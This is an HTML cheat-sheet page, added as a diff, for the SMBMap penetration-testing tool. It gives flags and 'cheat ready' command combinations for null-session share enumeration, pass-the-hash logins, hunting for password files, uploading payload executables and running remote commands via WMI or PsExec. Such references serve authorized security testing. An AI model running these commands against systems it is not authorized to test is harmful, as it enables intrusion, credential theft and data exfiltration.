@@ -1,0 +1,209 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">SMBMap</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Network/Windows</strong> • Focus: <strong>SMB Enumeration & Mapping</strong> • Last Updated: <strong>2025-09-04</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    SMBMap is a post-exploitation and penetration testing tool used to enumerate, list, and interact with SMB shares on a network. 
+    It helps security professionals discover accessible shares, check permissions, download/upload files, and execute commands. 
+    This makes it valuable for lateral movement, privilege escalation, and auditing misconfigured Windows file shares.
+  </p>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Identify target IP or hostname with SMB service open (usually TCP/445).</li>
+    <li>Run smbmap with authentication (or null sessions) to enumerate available shares.</li>
+    <li>Check permissions (read, write, execute) and attempt file listing or download.</li>
+    <li>Leverage misconfigurations for data exfiltration, privilege escalation, or further exploitation.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# Help
+smbmap -h                                      # Show help/usage and exit
+
+# ── Main Arguments ─────────────────────────────────────────────────────────────
+smbmap -H 192.168.1.10                         # -H HOST  Target IP/FQDN
+smbmap --host-file hosts.txt                   # --host-file FILE  Targets from file (one per line)
+smbmap -u jsmith -H 192.168.1.10               # -u USERNAME  Username (null session if omitted)
+smbmap -p 'Passw0rd!' -H 192.168.1.10          # -p PASSWORD  Cleartext password
+smbmap -p 'LMHASH:NTHASH' -H 192.168.1.10      # -p PASSWORD  NTLM hash as LM:NTHASH
+smbmap --prompt -u jsmith -H 192.168.1.10      # --prompt  Prompt for password interactively
+smbmap -s C$ -H 192.168.1.10                   # -s SHARE  Specify share (default C$)
+smbmap -d ACME -H 192.168.1.10                 # -d DOMAIN  Domain (default WORKGROUP)
+smbmap -P 445 -H 192.168.1.10                  # -P PORT  SMB port (default 445)
+smbmap -v -H 192.168.1.10                      # -v/--version  Return remote OS version
+smbmap --signing -H 192.168.1.10               # --signing  Check SMB signing (disabled/enabled/required)
+smbmap --admin -u admin -p pass -H 192.168.1.10# --admin  Report if user is local/domain admin
+smbmap --no-banner -H 192.168.1.10             # --no-banner  Hide banner
+smbmap --no-color -H 192.168.1.10              # --no-color  Plain output (no ANSI colors)
+smbmap --no-update -H 192.168.1.10             # --no-update  Suppress "Working on it" spinner
+smbmap --timeout 1.0 -H 192.168.1.10           # --timeout SECS  Port scan socket timeout (default 0.5s)
+
+# ── Kerberos Settings ─────────────────────────────────────────────────────────
+smbmap -k -d ACME -u jsmith -H dc.acme.local   # -k/--kerberos  Use Kerberos auth (ticket if available)
+smbmap --no-pass -k -H filesrv.acme.local      # --no-pass  Use CCache (export KRB5CCNAME=~/current.ccache)
+smbmap --dc-ip 10.0.0.10 -d ACME -H filesrv    # --dc-ip IP/Host  Specify Domain Controller
+
+# ── Command Execution ─────────────────────────────────────────────────────────
+smbmap -x "ipconfig /all" -H 192.168.1.10      # -x COMMAND  Execute command (requires rights)
+smbmap --mode wmi -x "whoami" -H 192.168.1.10  # --mode CMDMODE  Set exec method: wmi|psexec (default wmi)
+smbmap --mode psexec -x "hostname" -H 192.168.1.10 # Use PsExec-style execution
+
+# ── Shared Drive Search / Enumeration ─────────────────────────────────────────
+smbmap -L -H 192.168.1.10                      # -L  List all drives (ADMIN required)
+smbmap -r -H 192.168.1.10                      # -r [PATH]  Recursively list root of ALL shares
+smbmap -r "Users/Public" -H 192.168.1.10       # -r PATH  Recurse specific path in all shares
+smbmap --list-dir-timeout 120 -r -H 192.168.1.10 # --list-dir-timeout SECS  Stop recursion after timeout
+smbmap -g grep_out.txt -r -H 192.168.1.10      # -g FILE  Grep-friendly output file (used with -r)
+smbmap --csv shares.csv -r -H 192.168.1.10     # --csv FILE  CSV output (pairs well with -r)
+smbmap --dir-only -r -H 192.168.1.10           # --dir-only  List directories only
+smbmap --no-write-check -H 192.168.1.10        # --no-write-check  Skip WRITE access test
+smbmap -q -r -H 192.168.1.10                   # -q  Quiet: show only shares with READ/WRITE; suppress -A file listing
+smbmap --depth 2 -r -H 192.168.1.10            # --depth N  Limit recursion depth (default 1)
+smbmap --exclude ADMIN$ C$ -r -H 192.168.1.10  # --exclude SHARE [...]  Exclude share(s) from listing
+smbmap -A '(?i)(web|global)\.(asax|config)' -r -H 192.168.1.10
+                                               # -A REGEX  Auto-download files matching regex (requires -r)
+
+# ── File Content Search (experimental; requires admin & PowerShell) ───────────
+smbmap -F '[Pp]assword' -H 192.168.1.10        # -F REGEX  Search file contents for regex (admin + PowerShell)
+smbmap --search-path 'D:\HR\' -F 'SSN' -H 192.168.1.10
+                                               # --search-path PATH  Limit content search scope (default C:\Users)
+smbmap --search-timeout 600 -F 'token' -H 192.168.1.10
+                                               # --search-timeout SECS  Kill content search job after timeout (default 300s)
+
+# ── Filesystem Interaction ────────────────────────────────────────────────────
+smbmap --download 'C$\temp\passwords.txt' -H 192.168.1.10
+                                               # --download PATH  Download remote file
+smbmap --upload ./payload.exe 'C$\temp\payload.exe' -H 192.168.1.10
+                                               # --upload SRC DST  Upload local file to remote path
+smbmap --delete 'C$\temp\old.log' -H 192.168.1.10
+                                               # --delete PATH TO FILE  Delete remote file
+smbmap --delete 'C$\temp\old.log' --skip -H 192.168.1.10
+                                               # --skip  Skip delete confirmation prompt
+
+# ── Example Usage ─────────────────────────────────────────────────────────────
+smbmap -u guest -p "" -H 192.168.1.10          # Null session enumeration of shares
+smbmap -u ACME\\jsmith -p 'Passw0rd!' -r -H 192.168.1.10
+                                               # Recursive listing across all shares
+smbmap -u admin -p 'LMHASH:NTHASH' --admin -H 192.168.1.10
+                                               # Check if user has admin privileges
+smbmap -k --no-pass -d ACME -H filesrv         # Kerberos auth using existing ticket cache
+smbmap -A '(?i)\.(kdbx|pcap)$' -r -g out.txt -H 192.168.1.10
+                                               # Hunt & log interesting files (KeePass/pcap)
+smbmap --upload ./note.txt 'C$\temp\note.txt' -H 192.168.1.10
+                                               # Drop a file to a writable path
+
+  </pre>
+</section>
+<!-- Best Flag Combinations (Cheat Ready) — SMBMap -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Best Flag Combinations (Cheat Ready)</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# Quick anonymous/null session scan
+smbmap -H 192.168.1.10 -u guest -p ""           # Null auth to list accessible shares
+
+# Authenticated recursive share listing
+smbmap -H 192.168.1.10 -u user -p pass -r       # Recursively enumerate all shares
+
+# Greppable output for large-scale hunting
+smbmap -H 192.168.1.10 -u user -p pass -r -g shares.txt
+
+# CSV output for reporting
+smbmap -H 192.168.1.10 -u user -p pass -r --csv shares.csv
+
+# Exclude noisy admin shares
+smbmap -H 192.168.1.10 -u user -p pass -r --exclude ADMIN$ C$
+
+# Depth-limited search
+smbmap -H 192.168.1.10 -u user -p pass -r --depth 2
+
+# Auto-download sensitive config/web files
+smbmap -H 192.168.1.10 -u user -p pass -r -A '(?i)(web|global)\.(asax|config)'
+
+# File content search for credentials (requires admin + PowerShell)
+smbmap -H 192.168.1.10 -u admin -p pass -F '[Pp]assword'
+
+# Download a single file from a share
+smbmap -H 192.168.1.10 -u user -p pass --download 'C$\temp\doc.txt'
+
+# Upload a payload to writable directory
+smbmap -H 192.168.1.10 -u user -p pass --upload ./shell.exe 'C$\temp\shell.exe'
+
+# Execute command via WMI
+smbmap -H 192.168.1.10 -u admin -p pass -x "whoami" --mode wmi
+
+# Execute command via PsExec style
+smbmap -H 192.168.1.10 -u admin -p pass -x "hostname" --mode psexec
+
+# Check for SMB signing
+smbmap -H 192.168.1.10 --signing
+
+# Verify admin privileges
+smbmap -H 192.168.1.10 -u admin -p pass --admin
+
+  </pre>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://github.com/ShawnDEvans/smbmap" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        SMBMap GitHub Repository
+      </a>
+    </li>
+    <li>Metasploit, enum4linux, and crackmapexec are good complementary tools for SMB testing.</li>
+  </ul>
+</section>
+<br>
+<!-- Example Result (Toggle) — SMBMap -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <details class="group">
+    <summary class="cursor-pointer text-gray-200 font-semibold">Example Result of SMBMap</summary>
+    <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto text-gray-300 mt-3">
+
+[saide ~]$ smbmap -H 192.168.1.10 -u guest -p ""
+[+] IP: 192.168.1.10:445   Name: FILESERVER
+        Disk            Permissions     Comment
+        ----            -----------     -------
+        ADMIN$          NO ACCESS       Remote Admin
+        C$              NO ACCESS       Default share
+        IPC$            READ ONLY       IPC Service (Windows File Sharing)
+        Public          READ, WRITE     Shared folder
+        Users           READ ONLY       User profiles
+
+[saide ~]$ smbmap -H 192.168.1.10 -u user -p pass -r
+[+] IP: 192.168.1.10:445   Name: FILESERVER
+        Disk            Permissions     Comment
+        ----            -----------     -------
+        Public          READ, WRITE
+        .\Public\docs\
+        dr--r--r--                0  Mon Jan 01 10:00:00 2025 .
+        dr--r--r--                0  Mon Jan 01 10:00:00 2025 ..
+        -rw-r--r--             2048  Mon Jan 01 10:05:00 2025 credentials.txt
+        -rw-r--r--             4096  Mon Jan 01 10:07:00 2025 backup.zip
+
+[saide ~]$ smbmap -H 192.168.1.10 -u admin -p pass -x "whoami"
+[+] IP: 192.168.1.10:445   Name: FILESERVER
+[+] Command executed: whoami
+fileServer\administrator
+
+    </pre>
+  </details>
+</section>
